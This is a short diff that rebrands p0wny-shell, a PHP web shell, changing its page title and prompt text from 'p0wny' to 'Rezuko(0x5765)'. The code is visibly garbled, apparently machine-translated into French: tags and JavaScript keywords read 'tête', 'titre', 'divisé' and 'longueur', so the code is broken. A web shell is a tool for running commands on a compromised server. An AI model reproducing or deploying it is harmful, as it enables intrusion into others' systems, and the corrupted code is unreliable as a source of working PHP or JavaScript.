@@ -108,7 +108,7 @@ if ( isset ( $ _GET [ "fonctionnalité" ])) {
 
     < tête >
         < meta  charset = " UTF-8 " />
-        < titre > p0wny @ shell: ~ # </ title >
+        < titre > 0x5765 @ shell: ~ # </ title >
         < meta  name = " viewport " content = " width = device-width, initial-scale = 1.0 " />
         < style >
             html ,  corps {
@@ -360,7 +360,7 @@ if ( isset ( $ _GET [ "fonctionnalité" ])) {
                     var  splittedCwd  =  cwd . divisé ( "/" ) ;
                     shortCwd  =  "… /"  +  splittedCwd [ splittedCwd . length - 2 ]  +  "/"  +  splittedCwd [ splittedCwd . longueur - 1 ] ;
                 }
-                return  "p0wny @ shell: <span title = \" "  +  cwd  +  " \ ">"  +  shortCwd  +  "</span> #" ;
+                return  " Rezuko(0x5765) @ shell: <span title = \" "  +  cwd  +  " \ ">"  +  shortCwd  +  "</span> #" ;
             }
 
             function  updateCwd ( cwd )  {
